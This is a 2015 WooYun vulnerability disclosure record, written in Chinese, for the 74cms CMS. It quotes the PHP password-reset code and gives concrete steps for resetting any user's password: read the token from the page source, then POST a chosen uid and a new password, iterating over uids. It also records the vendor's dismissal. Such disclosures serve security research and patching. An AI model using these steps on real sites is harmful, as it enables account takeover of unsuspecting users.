{"id": 71630, "wybug_id": "wooyun-2015-0137785", "wybug_title": "74cms最新版重置任意账号密码", "wybug_corp": "74c,s.com", "wybug_author": "hello", "wybug_date": "2015-08-31 10:54", "wybug_open_date": "2015-12-04 10:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向公众公开  简要描述： 密码重置机制可以绕过，同时可重置任意账号密码 demo测试成功 详细说明：  先看下\\user\\user_getpass.php\n$act = !empty($_REQUEST['act']) ? trim($_REQUEST['act']) : 'enter';$smarty->assign('header_nav',\"getpass\");if ($act=='enter'){        $smarty->assign('title','找回密码 - '.$_CFG['site_name']);        $token=substr(md5(mt_rand(100000, 999999)), 8,16); //生成token        $_SESSION['getpass_token']=$token; //保存到session中        $smarty->assign('token',$token); //通过smarty 显示到前台 我们可以看到        $smarty->display('user/get-pass.htm');}\n我们在看下这个文件下的另一个action\nelseif($act == \"get_pass_save\"){        global $QS_pwdhash;        if(empty($_POST['token']) || $_POST['token']!=$_SESSION['getpass_token']) //这个值上面可以获得得到 这就绕过了        {                $link[0]['text'] = \"重新找回密码\";                $link[0]['href'] = \"?act=enter\";                showmsg(\"找回密码失败，非正常链接\",0,$link);        }        $uid=intval($_POST['uid']);//uid可控 遍历uid可重置任意账号密码        $password=$_POST['password']?trim($_POST['password']):showmsg(\"请输入密码！\",1);         $userinfo=get_user_inid($uid);        if(empty($userinfo))        {                $link[0]['text'] = \"重新找回密码\";                $link[0]['href'] = \"?act=enter\";                showmsg(\"修改密码失败\",0,$link);        }        $password_hash=md5(md5($password).$userinfo['pwd_hash'].$QS_pwdhash);        $setsqlarr['password']=$password_hash;        $rst=$db->updatetable(table('members'),$setsqlarr,array(\"uid\"=>$userinfo['uid']));//更改密码        if($rst)        {                header(\"Location: ?act=get_pass_sucess\");         }               else        {                showmsg(\"设置新密码失败！\",1);        }}\n   漏洞证明：  漏洞证明无需登录先访问\nhttp://demo.74cms.com/user/user_getpass.php\n右键查看源代码 看到toke的值\n\n然后利用这个值访问\nhttp://demo.74cms.com/user/user_getpass.php?act=get_pass_save\nPOST提交token=b6a0859f6f64ed41&uid=2&password=333333\n\n遍历下uid就可以重置任意账号密码为333333   修复方案：  post[id] 改成sessionid   版权声明：转载请注明来源 hello@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-12-04 10:56 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-31 10:55 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  好像补天也有噢    \n     2015-08-31 10:56 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:545 漏洞数:127        | 茶凉了，就不要再续了，再续也不是原来的味...)\t\t \n  @牛肉包子 包子哥 你好    \n     2015-08-31 11:20 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:868 漏洞数:102        )\t\t \n  @牛肉包子 牛肉哥  你好    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}